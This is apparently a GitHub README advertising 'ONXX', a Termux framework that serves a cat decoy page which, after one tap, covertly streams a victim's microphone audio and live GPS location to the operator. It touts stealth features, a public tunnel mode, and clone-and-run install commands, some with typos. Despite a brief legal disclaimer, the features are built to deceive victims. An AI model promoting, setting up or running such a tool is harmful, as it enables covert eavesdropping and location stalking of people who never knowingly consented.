<div align="center">

# 🐱 ONXX

### Covert Voice Capture & Live Location Tracking Framework

**Termux · Python · Browser-based Client Collection**

![Version](https://img.shields.io/badge/version-4.0-9d5cff?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Termux%20%2F%20Android-00f0ff?style=for-the-badge)
![Language](https://img.shields.io/badge/language-Python%20%2B%20Bash%20%2B%20JS-ff2bd6?style=for-the-badge)
![Status](https://img.shields.io/badge/status-stable-0f8?style=for-the-badge)

</div>

---

## 📖 Overview

**ONXX** is a lightweight client-side collection framework that runs entirely from **Termux on Android**. It serves a harmless-looking decoy page (a cute cat 🐱) that, with a single tap, silently streams **microphone audio** and **live GPS location** back to your device.

Designed for **authorized penetration testing**, **red-team engagements**, and **security research** — it demonstrates how easily browser permissions can be weaponized when users mindlessly click "Allow."

---

## ⚠️ Legal & Ethical Notice

> **READ THIS FIRST**
>
> This tool is provided **strictly for educational and authorized security testing purposes only**.
>
> - ✅ You may use it on **your own devices**, or on systems you have **explicit written permission** to test.
> - ❌ Using this tool to record or track **any person without their consent** is **illegal** in most jurisdictions and violates wiretapping / privacy laws (e.g., GDPR, IPC, CFAA).
> - 🔒 You are solely responsible for how you use this tool. The author accepts **no responsibility** for misuse.

---

## ✨ Features

| # | Feature | Detail |
|---|---------|--------|
| 🐱 | **Innocuous decoy page** | Victims see only a cute cat — zero indication of recording/location |
| 👆 | **Auto-appearing button** | Paw button pops in ~1.2s on page load; one tap enables mic + GPS |
| 🎙️ | **Chunked audio streaming** | 8s WebM/Opus chunks (MP4/Ogg fallback), 128 kbps, auto-retry |
| 📍 | **Live location tracking** | High-accuracy `watchPosition` stream + **human-readable area name** via OpenStreetMap reverse geocoding |
| 🛰️ | **Area / street resolution** | "Mahatma Gandhi Road, New Delhi" — not just coordinates |
| 📺 | **Admin dashboard** | `/admin` — live audio stats, file feed, location card, **Open in Maps** link |
| 💾 | **Dual storage** | Saves to Termux home **and** phone shared storage simultaneously |
| 🎧 | **MP3 auto-conversion** | Optional — if `ffmpeg` is installed, `.mp3` files are generated automatically |
| 🔐 | **TLS mode** | Self-signed HTTPS for browser mic/location permission compliance |
| ☁️ | **Cloudflare tunnel mode** | Real public HTTPS — **zero browser warnings**, works on WAN |
| 📡 | **LAN-friendly** | `0.0.0.0` binding; access from any device on the network |
| 🕵️ | **OpSec-friendly** | Silent server logs; victim page contains no suspicious strings |
---

## 🏗️ How It Works

~/onxx/
├── onxx.sh              # Main launcher (the only file you run)
├── server.crt           # Self-signed TLS certificate (auto-generated)
├── server.key           # TLS private key (auto-generated)
├── srv.py               # HTTP server + APIs (auto-generated)
├── web/
│   ├── index.html       # Cat decoy page (victim-facing)
│   └── admin.html       # Operations dashboard (attacker-facing)
└── recordings/          # Audio chunks saved here

**Termux se direct upload:**
```bash
gut clone https://gitHub.com/onxx-x146/VENOM.git
cd VEMON
chmod +x onxx.sh
./onxx.sh
```
## Follow In Instagram Telegram >>
[![Instagram](https://img.shields.io/badge/Instagram-Follow%20Now-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/__.l2l__)

[![Telegram](https://img.shields.io/badge/Telegram-Join%20Now-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/vasu90)
## BY : ONXX 🫅🏻    
